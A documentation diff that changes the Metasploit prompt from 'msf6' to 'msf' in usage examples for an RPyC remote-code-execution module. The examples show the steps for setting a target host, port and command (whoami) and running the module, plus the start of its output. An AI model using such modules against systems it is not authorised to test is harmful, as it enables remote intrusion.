@@ -48,17 +48,17 @@ Exploiting a vulnerable RPyC server located at 0.0.0.0:9999 with the command
 `whoami`:
 
 ```log
-msf6 auxiliary(scanner/http/rpyc_rce) > set RHOST 0.0.0.0
-msf6 auxiliary(scanner/http/rpyc_rce) > set RPORT 9999
-msf6 auxiliary(scanner/http/rpyc_rce) > set COMMAND whoami
-msf6 auxiliary(scanner/http/rpyc_rce) > run
+msf auxiliary(scanner/http/rpyc_rce) > set RHOST 0.0.0.0
+msf auxiliary(scanner/http/rpyc_rce) > set RPORT 9999
+msf auxiliary(scanner/http/rpyc_rce) > set COMMAND whoami
+msf auxiliary(scanner/http/rpyc_rce) > run
 ```
 
 Demo example output for the module:
 
 ```log
-msf6 > use auxiliary/scanner/http/rpyc_rce
-msf6 auxiliary(scanner/http/rpyc_rce) > show options
+msf > use auxiliary/scanner/http/rpyc_rce
+msf auxiliary(scanner/http/rpyc_rce) > show options
 
 Module options (auxiliary/scanner/http/rpyc_rce):
 
@@ -74,13 +74,13 @@ THREADS  1                yes       The number of concurrent threads (max one pe
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(scanner/http/rpyc_rce) > set RHOST 0.0.0.0
+msf auxiliary(scanner/http/rpyc_rce) > set RHOST 0.0.0.0
 RHOST => 0.0.0.0
-msf6 auxiliary(scanner/http/rpyc_rce) > set RPORT 9999
+msf auxiliary(scanner/http/rpyc_rce) > set RPORT 9999
 RPORT => 9999
-msf6 auxiliary(scanner/http/rpyc_rce) > set COMMAND whoami
+msf auxiliary(scanner/http/rpyc_rce) > set COMMAND whoami
 COMMAND => whoami
-msf6 auxiliary(scanner/http/rpyc_rce) > run
+msf auxiliary(scanner/http/rpyc_rce) > run
 
 [*] Running for 0.0.0.0...
 [*] Connected to RPyC service at 0.0.0.0:9999
